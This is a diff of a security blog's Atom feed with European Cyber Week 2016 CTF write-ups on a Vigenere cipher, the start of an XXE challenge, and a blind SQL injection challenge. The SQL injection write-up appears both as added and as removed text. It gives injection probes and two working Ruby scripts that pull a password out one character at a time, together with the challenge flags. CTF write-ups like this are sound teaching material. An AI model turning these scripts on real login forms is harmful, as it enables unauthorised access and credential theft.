+      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
+    
+    </summary>
+    
+      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
+    
+      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
+    
+    
+      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
+    
+      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
+    
+      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
+    
+      <category term="forensics" scheme="http://rawsec.ml/tags/forensics/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>ECW - 50 - Authentification - Web</title>
+    <link href="http://rawsec.ml/en/ECW-2016-authentification/"/>
+    <id>http://rawsec.ml/en/ECW-2016-authentification/</id>
+    <published>2016-11-05T23:00:00.000Z</published>
+    <updated>2016-11-07T21:45:01.537Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
+<thead>
+<tr>
+<th>By</th>
+<th>Version</th>
+<th>Comment</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>noraj</td>
+<td>1.0</td>
+<td>Creation</td>
+</tr>
+</tbody>
+</table>
+<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
+<li><strong>Name</strong> : European Cyber Week CTF Quals 2016</li>
+<li><strong>Website</strong> : <a href="https://challenge-ecw.fr/" target="_blank" rel="external">challenge-ecw.fr</a></li>
+<li><strong>Type</strong> : Online</li>
+<li><strong>Format</strong> : Jeopardy - Student</li>
+</ul>
+<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>N.A.</p>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>This is a <a href="https://www.owasp.org/index.php/Blind_SQL_Injection" target="_blank" rel="external">bling SQL injection</a> and Out-Of-Band (OOB) channel exfiltration is not working.<br>When giving a correct (well formed) SQLi we get the message: <code>Authentification valide. Le mot de passe est le flag.</code>.<br>So we are able to determine if a request is true or false.<br>So the following requests gave us some details about the DB:</p>
+<ul>
+<li><code>&#39; or 1=1 #</code> =&gt; MySQL Database</li>
+<li><code>&#39; or substring(version(),1,1)=5 #</code> =&gt; MySQL 5</li>
+<li><code>&#39; or (select 1)=1 #</code> =&gt; subselect supported</li>
+<li><code>&#39; or (select substring(concat(1,password),1,1) limit 0,1)=1 #</code> =&gt; column name is <em>password</em></li>
+</ul>
+<p>So our payload will be <code>SELECT password</code>.</p>
+<p>And here is the script I wrote :</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env ruby</span></div><div class="line"></div><div class="line"><span class="keyword">require</span> <span class="string">'curb'</span> <span class="comment"># for get/post requests</span></div><div class="line"></div><div class="line">hostname = <span class="string">'https://challenge-ecw.fr/chals/web100'</span></div><div class="line">nonce = <span class="string">'myNonce'</span></div><div class="line"></div><div class="line">c = Curl::Easy.new(hostname) <span class="keyword">do</span> <span class="params">|curl|</span></div><div class="line">  curl.headers[<span class="string">'Cookie'</span>] = <span class="string">'session=mySessionCookie'</span></div><div class="line">  curl.headers[<span class="string">'Referer'</span>] = hostname</div><div class="line">  curl.headers[<span class="string">'Host'</span>] = <span class="string">'challenge-ecw.fr'</span></div><div class="line">  curl.headers[<span class="string">'Connection'</span>] = <span class="string">'keep-alive'</span></div><div class="line">  curl.headers[<span class="string">'Upgrade-Insecure-Requests'</span>] = <span class="string">'1'</span></div><div class="line">  <span class="comment">#curl.verbose = true</span></div><div class="line"><span class="keyword">end</span> <span class="comment"># Curl</span></div><div class="line">c.perform <span class="comment"># send the request</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> c.body_str.match(<span class="regexp">/Veuillez vous authentifier pour r/</span>)</div><div class="line">  puts <span class="string">'• Connexion to ECW works'</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="comment"># Request we want to know the answer</span></div><div class="line">payload = <span class="string">'SELECT password'</span></div><div class="line"></div><div class="line"><span class="comment"># Find the length of the password</span></div><div class="line">length = <span class="number">0</span></div><div class="line"><span class="keyword">while</span> <span class="literal">true</span> <span class="keyword">do</span></div><div class="line">  c.http_post(Curl::PostField.content(<span class="string">'password'</span>, <span class="string">"' OR LENGTH((<span class="subst">#&#123;payload&#125;</span>))=<span class="subst">#&#123;length&#125;</span> #"</span>),</div><div class="line">              Curl::PostField.content(<span class="string">'nonce'</span>, nonce))</div><div class="line">  c.perform</div><div class="line">  <span class="keyword">if</span> c.body_str.match(<span class="regexp">/Authentification valide\. Le mot de passe est le flag\./</span>)</div><div class="line">    puts <span class="string">"Length: <span class="subst">#&#123;length&#125;</span>"</span></div><div class="line">    <span class="keyword">break</span></div><div class="line">  <span class="keyword">else</span></div><div class="line">    puts <span class="string">"Length: not <span class="subst">#&#123;length&#125;</span>"</span></div><div class="line">    length+=<span class="number">1</span></div><div class="line">  <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># Find each char of the password one by one</span></div><div class="line">answer = <span class="string">""</span></div><div class="line">(<span class="number">1</span>..length).each <span class="keyword">do</span> <span class="params">|offset|</span></div><div class="line">  (<span class="number">32</span>..<span class="number">126</span>).each <span class="keyword">do</span> <span class="params">|char|</span></div><div class="line">    c.http_post(Curl::PostField.content(<span class="string">'password'</span>, <span class="string">"' OR ASCII(SUBSTRING((<span class="subst">#&#123;payload&#125;</span>),<span class="subst">#&#123;offset&#125;</span>,1))=<span class="subst">#&#123;char&#125;</span> #"</span>),</div><div class="line">                Curl::PostField.content(<span class="string">'nonce'</span>, nonce))</div><div class="line">    c.perform</div><div class="line">    <span class="keyword">if</span> c.body_str.match(<span class="regexp">/Authentification valide\. Le mot de passe est le flag\./</span>)</div><div class="line">      answer.concat(char.chr)</div><div class="line">      puts <span class="string">"Password: <span class="subst">#&#123;answer&#125;</span>"</span></div><div class="line">      <span class="keyword">break</span></div><div class="line">    <span class="keyword">else</span></div><div class="line">      puts <span class="string">"Tried: <span class="subst">#&#123;answer&#125;</span><span class="subst">#&#123;char.chr&#125;</span>"</span></div><div class="line">    <span class="keyword">end</span></div><div class="line">  <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure>
+<p>We can optimize the time to get the password because we know that the flag is <code>ECW{md5(string)}</code> and md5 hashes contains only lower letters and digits that is 32 chars long. So we can fix some parameters:</p>
+<ul>
+<li>Lenght of the password: <strong>37</strong></li>
+<li>Alphabet: <strong>[“a”, “b”, “c”, “d”, “e”, “f”, “0”, “1”, “2”, “3”, “4”, “5”, “6”, “7”, “8”, “9”, “E”, “C”, “W”, “{“, “}”]</strong></li>
+</ul>
+<p>That give us the more optimized script:</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env ruby</span></div><div class="line"></div><div class="line"><span class="keyword">require</span> <span class="string">'curb'</span> <span class="comment"># for get/post requests</span></div><div class="line"></div><div class="line">hostname = <span class="string">'https://challenge-ecw.fr/chals/web100'</span></div><div class="line">nonce = <span class="string">'myNonce'</span></div><div class="line"></div><div class="line">c = Curl::Easy.new(hostname) <span class="keyword">do</span> <span class="params">|curl|</span></div><div class="line">  curl.headers[<span class="string">'Cookie'</span>] = <span class="string">'session=mySessionCookie'</span></div><div class="line">  curl.headers[<span class="string">'Referer'</span>] = hostname</div><div class="line">  curl.headers[<span class="string">'Host'</span>] = <span class="string">'challenge-ecw.fr'</span></div><div class="line">  curl.headers[<span class="string">'Connection'</span>] = <span class="string">'keep-alive'</span></div><div class="line">  curl.headers[<span class="string">'Upgrade-Insecure-Requests'</span>] = <span class="string">'1'</span></div><div class="line">  <span class="comment">#curl.verbose = true</span></div><div class="line"><span class="keyword">end</span> <span class="comment"># Curl</span></div><div class="line">c.perform <span class="comment"># send the request</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> c.body_str.match(<span class="regexp">/Veuillez vous authentifier pour r/</span>)</div><div class="line">  puts <span class="string">'• Connexion to ECW works'</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="comment"># Request we want to know the answer</span></div><div class="line">payload = <span class="string">'SELECT password'</span></div><div class="line"></div><div class="line">length = <span class="number">37</span></div><div class="line"></div><div class="line"><span class="comment"># Find each char of the password one by one</span></div><div class="line">answer = <span class="string">""</span></div><div class="line">ECW_flag_alphabet_array = (<span class="string">'a'</span>..<span class="string">'f'</span>).to_a + (<span class="number">0</span>.to_s..<span class="number">9</span>.to_s).to_a + [<span class="string">'E'</span>, <span class="string">'C'</span>, <span class="string">'W'</span>, <span class="string">'&#123;'</span>, <span class="string">'&#125;'</span>]</div><div class="line">(<span class="number">1</span>..length).each <span class="keyword">do</span> <span class="params">|offset|</span></div><div class="line">  ECW_flag_alphabet_array.each <span class="keyword">do</span> <span class="params">|char|</span></div><div class="line">    c.http_post(Curl::PostField.content(<span class="string">'password'</span>, <span class="string">"' OR ASCII(SUBSTRING((<span class="subst">#&#123;payload&#125;</span>),<span class="subst">#&#123;offset&#125;</span>,1))=<span class="subst">#&#123;char.ord&#125;</span> #"</span>),</div><div class="line">                Curl::PostField.content(<span class="string">'nonce'</span>, nonce))</div><div class="line">    c.perform</div><div class="line">    <span class="keyword">if</span> c.body_str.match(<span class="regexp">/Authentification valide\. Le mot de passe est le flag\./</span>)</div><div class="line">      answer.concat(char)</div><div class="line">      puts <span class="string">"Password: <span class="subst">#&#123;answer&#125;</span>"</span></div><div class="line">      <span class="keyword">break</span></div><div class="line">    <span class="keyword">else</span></div><div class="line">      puts <span class="string">"Tried: <span class="subst">#&#123;answer&#125;</span><span class="subst">#&#123;char&#125;</span>"</span></div><div class="line">    <span class="keyword">end</span></div><div class="line">  <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure>
+<p>So we got the flag: <code>ECW{d3832d5a1ef4c3bef82b87ced5f50e7d}</code>.</p>
+<p><strong>BONUS</strong>: I used my script to get the username:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">SELECT user()</div><div class="line">User: ecw@localhost</div></pre></td></tr></table></figure>
 ]]></content>
     
     <summary type="html">
@@ -156,6 +345,66 @@
       <category term="security" scheme="http://rawsec.ml/tags/security/"/>
     
       <category term="web" scheme="http://rawsec.ml/tags/web/"/>
+    
+      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
+    
+      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>ECW - 50 - Ave, César! - Cryptography</title>
+    <link href="http://rawsec.ml/en/ECW-2016-ave-cesar/"/>
+    <id>http://rawsec.ml/en/ECW-2016-ave-cesar/</id>
+    <published>2016-11-05T23:00:00.000Z</published>
+    <updated>2016-11-07T21:44:48.247Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
+<thead>
+<tr>
+<th>By</th>
+<th>Version</th>
+<th>Comment</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>noraj</td>
+<td>1.0</td>
+<td>Creation</td>
+</tr>
+</tbody>
+</table>
+<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
+<li><strong>Name</strong> : European Cyber Week CTF Quals 2016</li>
+<li><strong>Website</strong> : <a href="https://challenge-ecw.fr/" target="_blank" rel="external">challenge-ecw.fr</a></li>
+<li><strong>Type</strong> : Online</li>
+<li><strong>Format</strong> : Jeopardy - Student</li>
+</ul>
+<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>N.A.</p>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>This was not Caesar as title suggested but Vigenere code, a troll I guess…</p>
+<p>With some frequency analysis and bruteforce we found:</p>
+<ul>
+<li>The key was: <code>contest</code>.</li>
+<li>And the message was: <code>remporte cette epreuve grace au flag ecw accolade ouvrante d huit c trois un cinq cinq c huit six a six eef un huit db huit quatre cinq trois un sept b huit b cinq a sept deux accolade fermante. les chiffres et caracteres speciaux ont ete remplaces par leur nom textuel.</code>.</li>
+<li>That gave us the flag: <code>ECW{d8c3155c86a6eef18db845317b8b5a72}</code>.</li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
+    
+    </summary>
+    
+      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
+    
+      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
+    
+    
+      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
+    
+      <category term="crypto" scheme="http://rawsec.ml/tags/crypto/"/>
     
       <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
     
@@ -304,11 +553,11 @@
   </entry>
   
   <entry>
-    <title>ECW - 50 - Ave, César! - Cryptography</title>
-    <link href="http://rawsec.ml/en/ECW-2016-ave-cesar/"/>
-    <id>http://rawsec.ml/en/ECW-2016-ave-cesar/</id>
+    <title>ECW - 150 - Carnet d&#39;adresses - Web</title>
+    <link href="http://rawsec.ml/en/ECW-2016-carnet-dadresse/"/>
+    <id>http://rawsec.ml/en/ECW-2016-carnet-dadresse/</id>
     <published>2016-11-05T23:00:00.000Z</published>
-    <updated>2016-11-07T21:44:48.247Z</updated>
+    <updated>2016-11-07T21:45:06.257Z</updated>
     
     <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
 <thead>
@@ -333,86 +582,38 @@
 <li><strong>Format</strong> : Jeopardy - Student</li>
 </ul>
 <h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>N.A.</p>
-<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>This was not Caesar as title suggested but Vigenere code, a troll I guess…</p>
-<p>With some frequency analysis and bruteforce we found:</p>
-<ul>
-<li>The key was: <code>contest</code>.</li>
-<li>And the message was: <code>remporte cette epreuve grace au flag ecw accolade ouvrante d huit c trois un cinq cinq c huit six a six eef un huit db huit quatre cinq trois un sept b huit b cinq a sept deux accolade fermante. les chiffres et caracteres speciaux ont ete remplaces par leur nom textuel.</code>.</li>
-<li>That gave us the flag: <code>ECW{d8c3155c86a6eef18db845317b8b5a72}</code>.</li>
-</ul>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
-    
-    </summary>
-    
-      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
-    
-      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
-    
-    
-      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
-    
-      <category term="crypto" scheme="http://rawsec.ml/tags/crypto/"/>
-    
-      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
-    
-      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>ECW - 50 - Authentification - Web</title>
-    <link href="http://rawsec.ml/en/ECW-2016-authentification/"/>
-    <id>http://rawsec.ml/en/ECW-2016-authentification/</id>
-    <published>2016-11-05T23:00:00.000Z</published>
-    <updated>2016-11-07T21:45:01.537Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
-<thead>
-<tr>
-<th>By</th>
-<th>Version</th>
-<th>Comment</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>noraj</td>
-<td>1.0</td>
-<td>Creation</td>
-</tr>
-</tbody>
-</table>
-<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
-<li><strong>Name</strong> : European Cyber Week CTF Quals 2016</li>
-<li><strong>Website</strong> : <a href="https://challenge-ecw.fr/" target="_blank" rel="external">challenge-ecw.fr</a></li>
-<li><strong>Type</strong> : Online</li>
-<li><strong>Format</strong> : Jeopardy - Student</li>
-</ul>
-<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>N.A.</p>
-<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>This is a <a href="https://www.owasp.org/index.php/Blind_SQL_Injection" target="_blank" rel="external">bling SQL injection</a> and Out-Of-Band (OOB) channel exfiltration is not working.<br>When giving a correct (well formed) SQLi we get the message: <code>Authentification valide. Le mot de passe est le flag.</code>.<br>So we are able to determine if a request is true or false.<br>So the following requests gave us some details about the DB:</p>
-<ul>
-<li><code>&#39; or 1=1 #</code> =&gt; MySQL Database</li>
-<li><code>&#39; or substring(version(),1,1)=5 #</code> =&gt; MySQL 5</li>
-<li><code>&#39; or (select 1)=1 #</code> =&gt; subselect supported</li>
-<li><code>&#39; or (select substring(concat(1,password),1,1) limit 0,1)=1 #</code> =&gt; column name is <em>password</em></li>
-</ul>
-<p>So our payload will be <code>SELECT password</code>.</p>
-<p>And here is the script I wrote :</p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env ruby</span></div><div class="line"></div><div class="line"><span class="keyword">require</span> <span class="string">'curb'</span> <span class="comment"># for get/post requests</span></div><div class="line"></div><div class="line">hostname = <span class="string">'https://challenge-ecw.fr/chals/web100'</span></div><div class="line">nonce = <span class="string">'myNonce'</span></div><div class="line"></div><div class="line">c = Curl::Easy.new(hostname) <span class="keyword">do</span> <span class="params">|curl|</span></div><div class="line">  curl.headers[<span class="string">'Cookie'</span>] = <span class="string">'session=mySessionCookie'</span></div><div class="line">  curl.headers[<span class="string">'Referer'</span>] = hostname</div><div class="line">  curl.headers[<span class="string">'Host'</span>] = <span class="string">'challenge-ecw.fr'</span></div><div class="line">  curl.headers[<span class="string">'Connection'</span>] = <span class="string">'keep-alive'</span></div><div class="line">  curl.headers[<span class="string">'Upgrade-Insecure-Requests'</span>] = <span class="string">'1'</span></div><div class="line">  <span class="comment">#curl.verbose = true</span></div><div class="line"><span class="keyword">end</span> <span class="comment"># Curl</span></div><div class="line">c.perform <span class="comment"># send the request</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> c.body_str.match(<span class="regexp">/Veuillez vous authentifier pour r/</span>)</div><div class="line">  puts <span class="string">'• Connexion to ECW works'</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="comment"># Request we want to know the answer</span></div><div class="line">payload = <span class="string">'SELECT password'</span></div><div class="line"></div><div class="line"><span class="comment"># Find the length of the password</span></div><div class="line">length = <span class="number">0</span></div><div class="line"><span class="keyword">while</span> <span class="literal">true</span> <span class="keyword">do</span></div><div class="line">  c.http_post(Curl::PostField.content(<span class="string">'password'</span>, <span class="string">"' OR LENGTH((<span class="subst">#&#123;payload&#125;</span>))=<span class="subst">#&#123;length&#125;</span> #"</span>),</div><div class="line">              Curl::PostField.content(<span class="string">'nonce'</span>, nonce))</div><div class="line">  c.perform</div><div class="line">  <span class="keyword">if</span> c.body_str.match(<span class="regexp">/Authentification valide\. Le mot de passe est le flag\./</span>)</div><div class="line">    puts <span class="string">"Length: <span class="subst">#&#123;length&#125;</span>"</span></div><div class="line">    <span class="keyword">break</span></div><div class="line">  <span class="keyword">else</span></div><div class="line">    puts <span class="string">"Length: not <span class="subst">#&#123;length&#125;</span>"</span></div><div class="line">    length+=<span class="number">1</span></div><div class="line">  <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># Find each char of the password one by one</span></div><div class="line">answer = <span class="string">""</span></div><div class="line">(<span class="number">1</span>..length).each <span class="keyword">do</span> <span class="params">|offset|</span></div><div class="line">  (<span class="number">32</span>..<span class="number">126</span>).each <span class="keyword">do</span> <span class="params">|char|</span></div><div class="line">    c.http_post(Curl::PostField.content(<span class="string">'password'</span>, <span class="string">"' OR ASCII(SUBSTRING((<span class="subst">#&#123;payload&#125;</span>),<span class="subst">#&#123;offset&#125;</span>,1))=<span class="subst">#&#123;char&#125;</span> #"</span>),</div><div class="line">                Curl::PostField.content(<span class="string">'nonce'</span>, nonce))</div><div class="line">    c.perform</div><div class="line">    <span class="keyword">if</span> c.body_str.match(<span class="regexp">/Authentification valide\. Le mot de passe est le flag\./</span>)</div><div class="line">      answer.concat(char.chr)</div><div class="line">      puts <span class="string">"Password: <span class="subst">#&#123;answer&#125;</span>"</span></div><div class="line">      <span class="keyword">break</span></div><div class="line">    <span class="keyword">else</span></div><div class="line">      puts <span class="string">"Tried: <span class="subst">#&#123;answer&#125;</span><span class="subst">#&#123;char.chr&#125;</span>"</span></div><div class="line">    <span class="keyword">end</span></div><div class="line">  <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure>
-<p>We can optimize the time to get the password because we know that the flag is <code>ECW{md5(string)}</code> and md5 hashes contains only lower letters and digits that is 32 chars long. So we can fix some parameters:</p>
-<ul>
-<li>Lenght of the password: <strong>37</strong></li>
-<li>Alphabet: <strong>[“a”, “b”, “c”, “d”, “e”, “f”, “0”, “1”, “2”, “3”, “4”, “5”, “6”, “7”, “8”, “9”, “E”, “C”, “W”, “{“, “}”]</strong></li>
-</ul>
-<p>That give us the more optimized script:</p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env ruby</span></div><div class="line"></div><div class="line"><span class="keyword">require</span> <span class="string">'curb'</span> <span class="comment"># for get/post requests</span></div><div class="line"></div><div class="line">hostname = <span class="string">'https://challenge-ecw.fr/chals/web100'</span></div><div class="line">nonce = <span class="string">'myNonce'</span></div><div class="line"></div><div class="line">c = Curl::Easy.new(hostname) <span class="keyword">do</span> <span class="params">|curl|</span></div><div class="line">  curl.headers[<span class="string">'Cookie'</span>] = <span class="string">'session=mySessionCookie'</span></div><div class="line">  curl.headers[<span class="string">'Referer'</span>] = hostname</div><div class="line">  curl.headers[<span class="string">'Host'</span>] = <span class="string">'challenge-ecw.fr'</span></div><div class="line">  curl.headers[<span class="string">'Connection'</span>] = <span class="string">'keep-alive'</span></div><div class="line">  curl.headers[<span class="string">'Upgrade-Insecure-Requests'</span>] = <span class="string">'1'</span></div><div class="line">  <span class="comment">#curl.verbose = true</span></div><div class="line"><span class="keyword">end</span> <span class="comment"># Curl</span></div><div class="line">c.perform <span class="comment"># send the request</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> c.body_str.match(<span class="regexp">/Veuillez vous authentifier pour r/</span>)</div><div class="line">  puts <span class="string">'• Connexion to ECW works'</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="comment"># Request we want to know the answer</span></div><div class="line">payload = <span class="string">'SELECT password'</span></div><div class="line"></div><div class="line">length = <span class="number">37</span></div><div class="line"></div><div class="line"><span class="comment"># Find each char of the password one by one</span></div><div class="line">answer = <span class="string">""</span></div><div class="line">ECW_flag_alphabet_array = (<span class="string">'a'</span>..<span class="string">'f'</span>).to_a + (<span class="number">0</span>.to_s..<span class="number">9</span>.to_s).to_a + [<span class="string">'E'</span>, <span class="string">'C'</span>, <span class="string">'W'</span>, <span class="string">'&#123;'</span>, <span class="string">'&#125;'</span>]</div><div class="line">(<span class="number">1</span>..length).each <span class="keyword">do</span> <span class="params">|offset|</span></div><div class="line">  ECW_flag_alphabet_array.each <span class="keyword">do</span> <span class="params">|char|</span></div><div class="line">    c.http_post(Curl::PostField.content(<span class="string">'password'</span>, <span class="string">"' OR ASCII(SUBSTRING((<span class="subst">#&#123;payload&#125;</span>),<span class="subst">#&#123;offset&#125;</span>,1))=<span class="subst">#&#123;char.ord&#125;</span> #"</span>),</div><div class="line">                Curl::PostField.content(<span class="string">'nonce'</span>, nonce))</div><div class="line">    c.perform</div><div class="line">    <span class="keyword">if</span> c.body_str.match(<span class="regexp">/Authentification valide\. Le mot de passe est le flag\./</span>)</div><div class="line">      answer.concat(char)</div><div class="line">      puts <span class="string">"Password: <span class="subst">#&#123;answer&#125;</span>"</span></div><div class="line">      <span class="keyword">break</span></div><div class="line">    <span class="keyword">else</span></div><div class="line">      puts <span class="string">"Tried: <span class="subst">#&#123;answer&#125;</span><span class="subst">#&#123;char&#125;</span>"</span></div><div class="line">    <span class="keyword">end</span></div><div class="line">  <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure>
-<p>So we got the flag: <code>ECW{d3832d5a1ef4c3bef82b87ced5f50e7d}</code>.</p>
-<p><strong>BONUS</strong>: I used my script to get the username:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">SELECT user()</div><div class="line">User: ecw@localhost</div></pre></td></tr></table></figure>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>This one is a XML External Entity ([XXE][xxe]) attack and Out-Of-Band (OOB) channel exfiltration is not working.</p>
